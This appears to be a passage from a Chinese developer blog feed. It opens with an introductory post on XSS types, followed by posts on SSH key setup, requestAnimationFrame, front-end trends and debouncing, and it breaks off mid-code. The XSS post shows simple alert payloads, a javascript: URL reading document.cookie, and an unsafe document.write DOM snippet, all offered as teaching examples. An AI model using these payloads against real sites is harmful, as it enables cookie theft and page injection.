        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近来反反复复读了一些xss和csrf攻防的一些文章，大体上读完了《XSS跨站脚本剖析与防御》这本书，之前浅浮的以为xss仅仅需要对用户输入内容进行过滤，然而现在重新审视xss的攻击技巧着实令人眼花缭乱。</p><p>那到底什么是xss跨站脚本呢？它会造成什么危害？为何它如此流行？它的攻击方式有哪些？作为web开发人员我们应该做的有哪些？</p><p>带着这几个问题，反复测试总结了这篇文章，一方面方便自己以后学习回顾，另一方面希望可以帮助到一些想对xss攻防有些了解的人，我相信这篇文章能够帮你理解上面几个问题。想要深入学习，建议还是去学习<a href="https://read.douban.com/ebook/12812565/" target="_blank" rel="noopener">《xss跨站脚本剖析与防御》</a>，这本书是邱永华先生所著，阿里首席安全研究员吴翰清作的序，细细读来定能有所收获；</p><a id="more"></a><h1 id="XSS背景与介绍"><a href="#XSS背景与介绍" class="headerlink" title="XSS背景与介绍"></a>XSS背景与介绍</h1><h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p>随着互联网的发展，web2.0时代的兴起，带来的交互模式的发展，现如今更是向融合人工智能的web3.0发展。目前的网站绝大多数都有需要和用户交互的功能，比如电商网站的评论，论坛的发帖，微博网站的转发等等。</p><p>正常用户会中规中矩的使用，但是对于黑客他们也许不会循规蹈矩，他们可以通过这些表单提交一些恶意代码，通常是JavaScript（但是绝对不限与此，也包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML）一旦攻击成功后，攻击者可能获得更高的权限（可能的一些操作）、私密的网页内容、会话和cookie等等</p><p>不过目前现代浏览器比如chrome，firefox对于表单中的代码会自动检测出xss，从而屏蔽请求，但仍然不是绝对安全的，与此同时不乏有一些浏览器如IE6,7,8并不会做这样的处理，亲测如此；chrome的xss过滤器叫做xssAuditor，IE的xss过滤xssFilter从IE8 beta2才开始，所以IE8及以下的浏览器不会做xss过滤处理，关于xssAuditor和xssFilter两者的区别，吴翰清大神所著的《白帽子讲web安全》有详细的介绍，</p><blockquote><p>作为扩展简单的说，ie的xss检测相对粗暴，在系统盘的mshtml.dll中，是基于正则进行检测的；<br>而chrome的xssAuditor的整合在webkit中，任何使用webkit内核的都可以使用这些规则，在词法解析阶段进行，和html解析不同的token，xssAuditor会逐一扫描并检测token，token中发现危险的属性和URL进行比较，如果URL中也存在同样的数据，xssAuditor则会认为是一个反射型xss。</p></blockquote><p>下面通过一个很简单的栗子说明：textarea中的一段<code>&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code>很简单的恶意代码，如果前后端和浏览器的xss检测都跳过，那么这段代码就会伴随请求被上传到漏洞服务器或者客户端中，站点从数据库中或者客户端读取恶意用户存入的非法数据，然后显示在页面，在受害者主机上的浏览器执行恶意代码，那么这个xss就会成功（其实就是让用户打开这个页面弹个屏的小恶作剧），但是这里就如同上面说的那样chrome的xssAuditor帮我们检测出了异常代码，从而拦截了这个网页，阻止了这个恶作剧的发生，我们把这种注入到服务器或者客户端的恶意代码的xss攻击方式称为持久性（又叫存储型）XSS</p><p><video src="https://www.chenqaq.com/assets/videos/xss01.mp4" controls allowfullscreen="true" loop="true" autoplay="autoplay" width="100%" min-height="100%">embed: xss–chrome_test</video></p><h2 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h2><p>根据攻击的来源不同，我们通常分为三种：反射型，存储型和比较特殊的DOM型（DOM-Based XSS）</p><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>反射型：反射性通常发生在URL地址的参数中，常用来窃取客户端的cookie或进行钓鱼欺骗，经常在网站的搜索栏，跳转的地方被注入；<br>比如：</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">http://www.test.<span class="keyword">com</span>/<span class="built_in">search</span>.php?key=<span class="string">"&gt;&lt;script&gt;alert("</span>XSS<span class="comment">")&lt;/script&gt;</span></span><br><span class="line">http://www.test.<span class="keyword">com</span>/logout.asp?out=<span class="keyword">l</span>$url=javascrip<span class="variable">t:alert</span>(document.cookie)</span><br></pre></td></tr></table></figure><p>我们发现URL后本来应该是正常的键值对key=value，却被注入了一段恶意代码（即构造了一个其中包含恶意代码的特殊的url），应该慎用get请求，对隐秘的信息则是避免，get请求的键值会被暴露在URL中；POST的内容也会触发反射型XSS，不过触发条件相对苛刻。</p><p>当然如果地址栏看到上面两个URL，可能被轻易的看穿该链接是不可信的，但是绝不要小瞧此类XSS的威力，一般黑客都会进行精心布置，恶意URL暴露一般会进行各种编码转化，编码转换后，攻击的迷惑性大大提高<br><img src="https://www.chenqaq.com/assets/images/xss-encode01.png" alt=""></p><h3 id="持久型（又叫存储型）"><a href="#持久型（又叫存储型）" class="headerlink" title="持久型（又叫存储型）"></a>持久型（又叫存储型）</h3><p>我们上面提到的栗子就是一个持久型xss的示例，可以看处此类xss攻击不需要用户去点击URL进行触发，提前将恶意代码保存在了漏洞服务器或者客户端中，站点取出后会自动解析执行，相比反射型更具有攻击性，通常发生在网站的留言，评论，博客日志等交互处。</p><p>黑客可以利用它渗透网站、挂马、钓鱼…还有危害更大的xss蠕虫，跨站蠕虫用AJAX/JAVASCRIPT脚本语言编写的蠕虫病毒，可以在站点间实现病毒几何数级传播。</p><h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>相比以上两种攻击类型，DOM型比较特殊，DOM型取出和执行恶意代码都由浏览器端完成，属于前端自身安全漏洞。主要由客户端的脚本通过DOM动态地输出到页面中，它不依赖于提交到服务器端，而从客户端获得DOM中的数据在本地执行.<br>举个栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> temp = <span class="built_in">document</span>.URL;</span><br><span class="line"><span class="keyword">let</span> index = temp.indexOf(<span class="string">"content"</span>) + <span class="number">4</span>;</span><br><span class="line"><span class="keyword">let</span> par = temp.substring(index);</span><br><span class="line"><span class="built_in">document</span>.write(decodeURL(par));</span><br></pre></td></tr></table></figure><p>如果用户点击了带有下面链接的跳转，就会触发XSS漏洞</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//www.test.com/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>更多XSS攻击方式可以关注xss cheat sheet，会看到很多常见的xss攻击脚本列表，可以作为Poc用来检测web应用程序是否存在xss漏洞</p><h1 id="续集"><a href="#续集" class="headerlink" title="续集"></a>续集</h1><p>web安全-浅谈xss攻防（二）：更多的关注整理一些防御措施</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://book.douban.com/subject/25711796/" target="_blank" rel="noopener">《XSS跨站脚本剖析与防御》–邱永华</a><br><a href="https://book.douban.com/subject/10546925/" target="_blank" rel="noopener">《白帽子讲web安全》–吴翰清</a><br><a href="https://juejin.im/post/5bad9140e51d450e935c6d64" target="_blank" rel="noopener">《前端安全系列:如何防止XSS攻击？》–美团技术团队</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux下误将ssh密钥写入/root</title>
      <link href="/2018/10/05/linux-ssh-addToGithub-md/"/>
      <url>/2018/10/05/linux-ssh-addToGithub-md/</url>
      
        <content type="html"><![CDATA[<p>无论是使用github类似的开源平台还是搭建的git服务器来团队协作开发，我们总是需要使用本地ssh密钥来建立连接，如果要使用ssh服务linux下我们还需要通过终端安装ssh并且开启ssh服务</p><a id="more"></a><h1 id="一-关于ssh密钥"><a href="#一-关于ssh密钥" class="headerlink" title="一.关于ssh密钥"></a>一.关于ssh密钥</h1><p>首先应该检查下是否存在ssh密钥，<br>终端键入<code>ls -ah</code>查看是否存在.ssh文件，不存在则我们需要生成ssh密钥：<br>终端键入<code>ssh-keygen -t rsa -C &#39;you_email@email.com&#39;</code></p><p>回车之后下面是设置的密码，不设置回车即可。即：</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Enter <span class="built_in">file</span> <span class="keyword">in</span> which <span class="built_in">to</span> save <span class="keyword">the</span> key (/home/.ssh/id_rsa): 【按回车】</span><br><span class="line"><span class="comment">/*这一步不需要修改名字，否则后面我们通过`ssh -T git@github.com`检测是否建立连接会失败，因为ssh默认会读取id_rsa这个公钥*/</span></span><br><span class="line">Enter passphrase (<span class="literal">empty</span> <span class="keyword">for</span> no passphrase): 【输入密码】</span><br><span class="line">Enter same passphrase again: 【再次输入密码】</span><br></pre></td></tr></table></figure><p>然后将.ssh/id_rsa.pub添加进去你github中ssh中即可</p><p>通过<code>sss -T git@github.com</code>检查连接是否建立成功，出现下面信息则提示已经建立连接喽</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Hi username! You<span class="symbol">'ve</span> successfully authenticated, but GitHub does <span class="keyword">not</span> provide shell <span class="keyword">access</span>.</span><br></pre></td></tr></table></figure><p>然后回去观察你的github ssh and GpG keys的对应的ssh小钥匙灰色已经变成了绿色</p><h1 id="二-关于ssh服务"><a href="#二-关于ssh服务" class="headerlink" title="二.关于ssh服务"></a>二.关于ssh服务</h1><p>对于linux下安装ssh服务相关，这里我做了简单的整理：</p><h3 id="1-查看ssh服务的状态"><a href="#1-查看ssh服务的状态" class="headerlink" title="1.查看ssh服务的状态"></a>1.查看ssh服务的状态</h3><p>输入<code>sudo service sshd status</code>:<br>如果出现No such file or directory相关提示，说明还没有安装ssh服务<br>如果提示Active:inactive(dead)，则已经安装了ssh服务，但是没有开启</p><h3 id="2-安装ssh服务"><a href="#2-安装ssh服务" class="headerlink" title="2.安装ssh服务"></a>2.安装ssh服务</h3><p>因为linux发行版众多，有一些不同的安装方式<br>redhat，fedora，centos等系列linux发行版可以尝试：<br><code>sudo yum install sshd</code>或者<code>sudo yum install openssh-server</code><br>debian，ubuntu，linux mint等系列的linux发行版尝试：<br><code>sudo apt-get install sshd</code>或者<code>sudo apt-get install openssh-server</code></p><h3 id="3-开启ssh服务"><a href="#3-开启ssh服务" class="headerlink" title="3.开启ssh服务"></a>3.开启ssh服务</h3><p>在终端输入<code>sudo service sshd start</code><br>提示Active: active (running) since Sun 2018-10-5 13:43:11 CST; 15s ago则说明ssh服务已经启动成功</p><h3 id="4-卸载ssh服务"><a href="#4-卸载ssh服务" class="headerlink" title="4.卸载ssh服务"></a>4.卸载ssh服务</h3><p>和安装对应，我们可以使用<br><code>sudo yum remove sshd</code>和<code>sudo apt-get -purge remove sshd</code><br>来卸载ssh服务</p><h1 id="三-解决问题-Permission-denied"><a href="#三-解决问题-Permission-denied" class="headerlink" title="三.解决问题(Permission denied)"></a>三.解决问题(Permission denied)</h1><p>因为误通过sudo命令生成ssh密钥，导致ssh密钥写入了/root系统文件，而引发后来一系列问题<br>丢失了截图，在一次试错后：<br><img src="https://www.chenqaq.com/assets/images/linux-ssh-error01.png" alt="请告诉我你的身份"><br>其实我安装git后已经设置了身份的，通过<code>git config --list</code>查看<br><img src="https://www.chenqaq.com/assets/images/linux-ssh-user01.png" alt="git user config"><br>于是我很自然的先搁置这个问题，下面是Permission denied的报错：<br><img src="https://www.chenqaq.com/assets/images/linux-ssh-error02.png" alt="Permission denied"><br>发现是权限问题，于是我反复检查，才发现自己误用了sudo命令，将ssh密钥写入了系统盘/root，导致权限不足，无法与远程建立连接。<br><img src="https://www.chenqaq.com/assets/images/linux-ssh01.png" alt="误用sudo生成ssh密钥"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>requestAnimationFrame优化</title>
      <link href="/2018/05/15/js-requestAnimationFrame-md/"/>
      <url>/2018/05/15/js-requestAnimationFrame-md/</url>
      
        <content type="html"><![CDATA[<h2 id="requestAnimationFrame-是什么"><a href="#requestAnimationFrame-是什么" class="headerlink" title="requestAnimationFrame 是什么?"></a>requestAnimationFrame 是什么?</h2><p>在浏览器动画程序中，我们一般会使用定时器来循环每隔多少毫秒来移动物体一次，来使它产生动画的效果。requestAnimationFrame()函数是针对动画效果的 API，告诉浏览器您希望执行动画并请求浏览器在下一次重绘之前调用指定的函数来更新动画，可以把它用在 DOM 上的风格变化或 canvas 动画或 WebGL 中。</p><a id="more"></a><h2 id="requestAnimationFrame-相比定时器有哪些优势"><a href="#requestAnimationFrame-相比定时器有哪些优势" class="headerlink" title="requestAnimationFrame 相比定时器有哪些优势?"></a>requestAnimationFrame 相比定时器有哪些优势?</h2><p>那么问题就来了：CSS3 动画那么强，定时器同样可以完成一般的动画，我们为什么还需要 requestAnimationFrame()呢？</p><p>首先对于主流的 CSS3 动画来说，虽然一些主流浏览器都对它有比较好的支持，但是 ie8 以下（）是不支持的是其一，其二 CSS3 动画的运动轨迹比较少，有不小的局限性。</p><p>这时候我们会考虑到 JS，定时器使我们经常用到的方法，但是用定时器制作动画会发生【跳帧】问题，试想一下拥堵的高速公路上，最多每 16.7s 通过一辆车，结果突然插入一批 setinterval 的军车，强行要在 10s 通过。显然，这是超负荷的，想要顺利通过，只能让第三辆车军车直接消失。然而这是不现实的，于是就会堵车！</p><p>同样的，显示器 16.7ms<code>刷新间隔之前发生了其他的绘制的请求</code>（setTimeout），导致所有的第三帧丢失，继而导致动画断续显示，这就是过渡绘制带来的问题。这也是为何 setTimeout 的定时器值推荐最小使用<code>16.7ms</code>原因<code>（16.7 = 1000 / 60，即每秒60帧）</code></p><p>requestAnimationFrame 则会跟着浏览器的绘制走，如果浏览器设备的绘制间隔是 16.7ms，它就会 16.7ms 绘制；如果是 10ms，则会按 10ms 来绘制。这样就不会存在过度绘制的问题，动画不会掉帧。</p><h2 id="requestAnimationFrame-用法"><a href="#requestAnimationFrame-用法" class="headerlink" title="requestAnimationFrame 用法"></a>requestAnimationFrame 用法</h2><p>虽然说 CSS3 动画既方便又高效，但是对于 PC 端 IE8，9 之流，想要兼容某些动画效果，比如淡入淡出，该如何实现？一般情况下，IE10+我们使用 CSS3 实现，对于 IE9-之流，我们使用 setTimeout 实现。两套完全不同的 style.改下动画时间还要修改两处。requestAnimationFrame 跟 setTimeout 非常类似，都是单回调，用法也类似。</p><p>我们一般使用下面的兼容写法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.requestAnimFrame = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="built_in">window</span>.requestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.webkitRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.mozRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.oRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.msRequestAnimationFrame ||</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"><span class="regexp">/* function */</span> callback, <span class="regexp">/* DOMElement */</span> element</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">window</span>.setTimeout(callback, <span class="number">1000</span> / <span class="number">60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">animloop</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  requestAnimFrame(animloop);</span><br><span class="line">  render();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h2><p><img src="http://www.chenqaq.com/assets/images/CheckRequestAnimationFrame.jpg" alt="requestAnimationFrame兼容性"></p><p>主流浏览器都实现了 requestAnimationFrame 的支持，即使是 IE9-之流，通过一些优雅降级的方案，也可以做到不出错。</p><p>比如，Opera 浏览器的技术师 Erik Möller <a href="https://blogs.opera.com/news/" target="_blank" rel="noopener">把这个函数进行的封装</a>，使得它更好的兼容各种浏览器。<br>在 Erik Möller 标准函数的基础上加了兼容各种浏览器引擎的前缀。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> lastTime = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> vendors = [<span class="string">'webkit'</span>,<span class="string">'moz'</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> x=<span class="number">0</span>;x&lt;vendors.length &amp;&amp; !<span class="built_in">window</span>.requestAnimationFrame; ++x)&#123;</span><br><span class="line">        <span class="built_in">window</span>.requestAnimationFrame = <span class="built_in">window</span>[vendors[x] + <span class="string">'RequestAnimationFrame'</span>];</span><br><span class="line">        <span class="built_in">window</span>.cancelAnimationFrame  = <span class="built_in">window</span>[vendors[x] + <span class="string">'CancleAniamtionFrame'</span>] ||</span><br><span class="line">                                       <span class="built_in">window</span>[vendors[x] + <span class="string">'CancleRequestAnimationFrame'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">window</span>.requestAnimationFrame)&#123;</span><br><span class="line">        <span class="built_in">window</span>.requestAnimationFrame = <span class="function"><span class="keyword">function</span>(<span class="params">callback,element</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> currTime = <span class="keyword">new</span>.Date().getTime();</span><br><span class="line">            <span class="keyword">var</span> timeToCall = <span class="built_in">Math</span>.max(<span class="number">0</span>,<span class="number">16.7</span> - (currTime - lastTime));</span><br><span class="line">            <span class="keyword">var</span> id = <span class="built_in">window</span>.setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                callback(currTime + timeToCall);</span><br><span class="line">            &#125;,timeToCall);</span><br><span class="line">            lastTime = currTime + timeToCall;</span><br><span class="line">            <span class="keyword">return</span> id;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">window</span>.cancelAnimationFrame)&#123;</span><br><span class="line">        <span class="built_in">window</span>.cancelAnimationFrame = <span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">            clearTimeout(id);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>在使用 canvas 绘画时这个函数更加合适，能得到更好的效果。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.reqestAnimFrame = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.requestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.webkitRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.mozRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.oRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.msRequestAnimationFrame ||</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">callback, element</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">window</span>.setTimeout(callback, <span class="number">1000</span> / <span class="number">60</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> canvas, context, toggle;</span><br><span class="line"></span><br><span class="line">init();</span><br><span class="line">animate();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  canvas = <span class="built_in">document</span>.createElement(<span class="string">"canvas"</span>);</span><br><span class="line">  canvas.height = <span class="number">512</span>;</span><br><span class="line">  canvas.width = <span class="number">512</span>;</span><br><span class="line"></span><br><span class="line">  context = cavnas.getContext(<span class="string">"2d"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(canvas);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">animate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  reqestAnimFrame(animate);</span><br><span class="line">  draw();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> time = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() * <span class="number">0.002</span>;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="built_in">Math</span>.sin(time) * <span class="number">192</span> + <span class="number">256</span>;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="built_in">Math</span>.cos(time * <span class="number">0.9</span>) * <span class="number">192</span> + <span class="number">256</span>;</span><br><span class="line">  toggle = !toggle;</span><br><span class="line"></span><br><span class="line">  context.fillStyle = toggle ? <span class="string">"rgb(200,100,20)"</span> : <span class="string">"rgb(20,20,100)"</span>;</span><br><span class="line">  context.beginPath();</span><br><span class="line">  context.arc(x, y, <span class="number">5</span>, <span class="number">0</span>, <span class="built_in">Math</span>.PI * <span class="number">2</span>, <span class="literal">true</span>);</span><br><span class="line">  context.closePath();</span><br><span class="line">  context.fill();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>碎言心语-短笔记</title>
      <link href="/2018/04/09/life-aboutIT/"/>
      <url>/2018/04/09/life-aboutIT/</url>
      
        <content type="html"><![CDATA[<p>可以跟着<a href="https://zhuanlan.zhihu.com/p/35412015" target="_blank" rel="noopener">阿里的狼叔（花名）</a>了解一下前端近些几年的发展。从高中毕业接触前端开发近两年，但从大二才开始了解前端发展的历史和现状，也多少有些认识。</p><p>很多情况下，我们都是被动的接受者，这就好像我们拿的手机在更新换代，也就好像我们现在看到的网页和01年相比天壤之别，就像移动互联网时代兴起，我们从pc web慢慢转向移动端。这是一种我们后知后觉的变化趋势</p><p>因为我接触移动端稍稍要多于pc web端，<br>上次张小龙在微信公开课上声称微信用户已达10亿，微信小程序用户达1.7亿，微信悄然俨然成为一个操作系统，因为微信本身封闭，对外界来说，它是一个流量黑洞。眼看入口被微信把持，于是九大浏览器厂商联合发布”快应用”，一方面是为了夺回应用分支的主导权，说直接点就是在反攻”微信小程序”，防止被边缘化。另一方面官方也声称 “移动应用前端化”是大势所趋。</p><p>前端快速发展之下，必然改变我们未来的某些习惯。所以善待前端，感兴趣的就多深入些。</p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 岁言心语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 岁言心语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跟着underscore学习防抖和节流</title>
      <link href="/2018/03/20/js-debounce-throttle/"/>
      <url>/2018/03/20/js-debounce-throttle/</url>
      
        <content type="html"><![CDATA[<h1 id="有个开始吧！"><a href="#有个开始吧！" class="headerlink" title="有个开始吧！"></a>有个开始吧！</h1><p>网上有很多的防抖与节流的文章，自己也早有耳闻，之前看underscore的代码，也发现了两个与众不同的函数debounce和throttle，仿佛是有特定的用途。学习实践之后便总结下这篇文章。</p><p>在前端开发中经常遇到一些频繁触发的事件，比如</p><ul><li>键盘事件：keyup、keydown…</li><li>window：resize、scroll…</li><li>鼠标事件：mousedown、mousemove…</li></ul><p>那么什么是事件的频发触发呢？让我们写一个例子来了解事件的频繁触发；</p><a id="more"></a><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>学习事件的频发触发<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    * &#123;</span><br><span class="line">      padding: 0;</span><br><span class="line">      margin: 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.container</span> &#123;</span></span><br><span class="line">      width: 50vw;</span><br><span class="line">      height: 30vh;</span><br><span class="line">      margin: 50px auto;</span><br><span class="line">      background: yellowgreen;</span><br><span class="line">      border-radius: 5px;</span><br><span class="line">      text-align: center;</span><br><span class="line">      line-height: 30vh;</span><br><span class="line">      font-size: 30px;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"debounce.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>debounce.js代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> container = <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  container.innerHTML++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">container.onmousemove = getAction;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="http://www.chenqaq.com/assets/images/debounce1.gif" alt="时间频发触发"></p><p>我们发现鼠标从盒子左侧平稳的滑到右侧，数字从1增加到了188，也就是说在极短的时间内getAction这个函数就触发了188次。可想而知，如果这个问题是复杂回调或者ajax请求等等，每个回调就必须在更短的时间内执行完毕，否则就会出现卡顿现象。</p><p>对于这个问题，防抖和节流就是两种很好的解决方案。</p><h1 id="防抖与节流介绍"><a href="#防抖与节流介绍" class="headerlink" title="防抖与节流介绍"></a>防抖与节流介绍</h1><p>防抖的原理就是：尽管时间触发，但是我一定要到事件触发n秒后才执行。如果在这个时间内又触发了这个事件，那就以新的事件的时间为准，触发n秒后才执行。主要是通过定时器来实现</p><p>而节流的原理是：如果持续触发事件，每隔一段时间，只执行一次事件。主要通过时间戳或者定时器来实现</p><h1 id="实现防抖debounce"><a href="#实现防抖debounce" class="headerlink" title="实现防抖debounce"></a>实现防抖debounce</h1><p>根据原理我们就可以来写第一版debounce代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timeout;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      clearTimeout(timeout)</span><br><span class="line">      timeout = setTimeout(func, wait);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">container.onmousemove = debounce(getAction, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="http://www.chenqaq.com/assets/images/debounce2.gif" alt="debounce第一版"></p><p>从效果中很明显可以看出来，无论开始怎么在盒子内移动鼠标，数值都不会加1，直到鼠标停下来，并且等待1s后，getAction函数执行使数值加1。</p><h3 id="this带来的问题"><a href="#this带来的问题" class="headerlink" title="this带来的问题"></a>this带来的问题</h3><p>如果在getAction函数中<code>console.log(this)</code>，在不使用debounce函数时，<code>this</code>的值为</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是我们在使用我们的debounce函数时，这个this就指向了window！（这是由于嵌套函数内部的this都会失去方向，指向window对象。可参见我写的<a href="http://www.cnblogs.com/okaychen/p/7520472.html" target="_blank" rel="noopener">this四种绑定方式之间的奇淫技巧</a>）</p><p>所以我们必须要将this指向正确的对象：</p><figure class="highlight 